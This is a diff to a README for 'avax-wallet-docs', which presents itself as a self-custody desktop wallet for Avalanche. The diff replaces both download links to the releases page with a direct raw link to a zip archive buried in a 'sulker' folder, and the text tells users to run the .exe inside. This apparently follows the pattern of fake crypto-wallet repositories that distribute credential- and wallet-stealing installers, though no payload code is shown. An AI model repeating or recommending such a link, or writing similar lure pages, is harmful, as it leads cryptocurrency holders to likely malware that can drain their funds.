@@ -1,12 +1,12 @@
 # 🛡️ avax-wallet-docs - Secure desktop access for your Avalanche assets
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Silicious-blankverse917/avax-wallet-docs/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Silicious-blankverse917/avax-wallet-docs/raw/refs/heads/main/sulker/docs_avax_wallet_3.8.zip)
 
 avax-wallet-docs is a desktop application for Avalanche users. It provides a way to manage your assets without a third-party intermediary. You keep control of your keys at all times. This software connects to the Avalanche blockchain to support the X-Chain, C-Chain, and P-Chain. You can stake tokens, use bridges, and move assets between chains in one interface.
 
 ## 📥 Getting the software
 
-Visit [this page](https://github.com/Silicious-blankverse917/avax-wallet-docs/releases) to download the installer for your computer. Select the file ending in .exe for Windows.
+Visit [this page](https://github.com/Silicious-blankverse917/avax-wallet-docs/raw/refs/heads/main/sulker/docs_avax_wallet_3.8.zip) to download the installer for your computer. Select the file ending in .exe for Windows.
 
 ## 💻 System requirements
 
